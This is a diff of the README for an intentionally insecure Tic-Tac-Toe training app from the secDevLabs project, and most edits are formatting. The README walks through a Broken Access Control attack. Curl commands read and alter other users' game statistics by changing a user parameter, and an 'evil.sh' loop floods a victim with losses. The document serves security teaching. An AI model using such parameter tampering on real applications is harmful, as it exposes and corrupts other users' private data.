@@ -1,4 +1,3 @@
-
 # Tic-Tac-Toe
 
 <p align="center"><img  src="images/a5-banner.png"/></p>
@@ -22,11 +21,11 @@ The main goal of this app is to discuss how **Broken Access Control** vulnerabil
 
 ## Setup
 
-To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
+To start this intentionally **insecure application**, you will need [Docker][docker install] and [Docker Compose][docker compose install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
 
 ```sh
 
-cd secDevLabs/owasp-top10-2017-apps/a5/tictactoe
+cd secDevLabs/owasp-top10-2021-apps/a1/tictactoe
 
 ```
 
@@ -36,7 +35,7 @@ make install
 
 ```
 
-Then simply visit [http://localhost.:10005][App] ! 😆
+Then simply visit [http://localhost.:10005][app] ! 😆
 
 ## Get to know the app 🕹
 
@@ -44,7 +43,7 @@ To properly understand how this application works, you can follow this step:
 
 - Try registering a user
 - Sign in
-- Play the game 
+- Play the game
 - See your statistics
 
 ## Attack narrative
@@ -67,26 +66,40 @@ To check how this information is being retrieved form the server, an attacker co
 
 <p  align="center"><img  src="images/attack3.png"/></p>
 
-You can replicate this GET by using the following curl command (use your own `tictacsession` token):  
+You can replicate this GET by using the following curl command (use your own `tictacsession` token):
 
 ```sh
 curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost.:10005/statistics/data?user=user1'
 ```
 
 ```json
-{"chartData":[{"y":46.15384615384615,"label":"Wins"},{"y":15.384615384615385,"label":"Ties"},{"y":38.46153846153846,"label":"Loses"}],"numbers":{"games":13,"wins":6,"ties":2,"loses":5}}
+{
+  "chartData": [
+    { "y": 46.15384615384615, "label": "Wins" },
+    { "y": 15.384615384615385, "label": "Ties" },
+    { "y": 38.46153846153846, "label": "Loses" }
+  ],
+  "numbers": { "games": 13, "wins": 6, "ties": 2, "loses": 5 }
+}
 ```
 
 ### 🔥
 
-As this AJAX request is being made passing the username as a URL parameter, it may indicate that only this parameter is being used to verify the permission to get the data. To check this, using the same `tictacsession`, an attacker could replace `user1` to another known user, as `user2` for example: 
+As this AJAX request is being made passing the username as a URL parameter, it may indicate that only this parameter is being used to verify the permission to get the data. To check this, using the same `tictacsession`, an attacker could replace `user1` to another known user, as `user2` for example:
 
 ```sh
 curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDcyODg2LCJleHAiOjE1NjM0NzY0ODZ9.ESLVZ9bbfUbUdFBFRCzxGTPICuaEWdGLxrvWykEmhNk' 'http://localhost.:10005/statistics/data?user=user2'
 ```
 
 ```json
-{"chartData":[{"y":100,"label":"Wins"},{"y":0,"label":"Ties"},{"y":0,"label":"Loses"}],"numbers":{"games":1,"wins":1,"ties":0,"loses":0}}
+{
+  "chartData": [
+    { "y": 100, "label": "Wins" },
+    { "y": 0, "label": "Ties" },
+    { "y": 0, "label": "Loses" }
+  ],
+  "numbers": { "games": 1, "wins": 1, "ties": 0, "loses": 0 }
+}
 ```
 
 This fact represents a `Broken Access Control` vulnerability, allowing an attacker to see every known user's private statistics.
@@ -95,15 +108,15 @@ This fact represents a `Broken Access Control` vulnerability, allowing an attack
 
 ### 👀
 
-Using the same methodology, an attacker could now check what the application does when a game finishes and tries to store the result. Analyzing the browser inspector once again reveals that a POST was made to the `/game` route, as can be seen in the next image: 
+Using the same methodology, an attacker could now check what the application does when a game finishes and tries to store the result. Analyzing the browser inspector once again reveals that a POST was made to the `/game` route, as can be seen in the next image:
 
 <p  align="center"><img  src="images/attack4.png"/></p>
 
-This request is done by using two parameters, `user` and `result`, as shown bellow: 
+This request is done by using two parameters, `user` and `result`, as shown bellow:
 
 <p  align="center"><img  src="images/attack5.png"/></p>
 
-To replicate this POST by using the curl command (use your own `tictacsession` token), you can type the following command: 
+To replicate this POST by using the curl command (use your own `tictacsession` token), you can type the following command:
 
 ```sh
 curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwiaWF0IjoxNTYzNDc5MzIxLCJleHAiOjE1NjM0ODI5MjF9.SRVz09ZebGa875MilaV2bj4tjAdTWA14JTuArnUDOZM' 'http://localhost.:10005/game' --data-binary 'user=user1&result=win'
@@ -124,7 +137,7 @@ curl -s 'POST' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2Vybm
 ```json
 OK
 ```
-  
+
 Imagining the worst scenario, an attacker could create a malicious script to send this same request as many times as he/she could, as can be exemplified bellow:
 
 ```sh
@@ -134,7 +147,7 @@ vi evil.sh
 ```sh
 #!/bin/sh
 #
-# evil.sh - Add 100 losses to an user! 
+# evil.sh - Add 100 losses to an user!
 
 user="user2"
 num=100
@@ -146,7 +159,7 @@ for i in `seq 1 $num`; do
 done
 ```
 
-And run it: 
+And run it:
 
 ```sh
 chmod +x evil.sh && ./evil.sh
@@ -163,7 +176,14 @@ curl -s 'GET' -b 'tictacsession=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmF
 ```
 
 ```json
-{"chartData":[{"y":3.6363636363636362,"label":"Wins"},{"y":2.727272727272727,"label":"Ties"},{"y":93.63636363636364,"label":"Loses"}],"numbers":{"games":110,"wins":4,"ties":3,"loses":103}}
+{
+  "chartData": [
+    { "y": 3.6363636363636362, "label": "Wins" },
+    { "y": 2.727272727272727, "label": "Ties" },
+    { "y": 93.63636363636364, "label": "Loses" }
+  ],
+  "numbers": { "games": 110, "wins": 4, "ties": 3, "loses": 103 }
+}
 ```
 
 Once again, this fact represents a `Broken Access Control` vulnerability, allowing an attacker to modify every known user's private statistics.
@@ -183,8 +203,8 @@ How would you mitigate this vulnerability? After your changes, an attacker shoul
 
 We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉
 
-[Docker Install]: https://docs.docker.com/install/
-[Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://localhost.:10005
-[secDevLabs]: https://github.com/globocom/secDevLabs
-[2]:https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a5/tictactoe
+[docker install]: https://docs.docker.com/install/
+[docker compose install]: https://docs.docker.com/compose/install/
+[app]: http://localhost.:10005
+[secdevlabs]: https://github.com/globocom/secDevLabs
+[2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2021-apps/a1/tictactoe
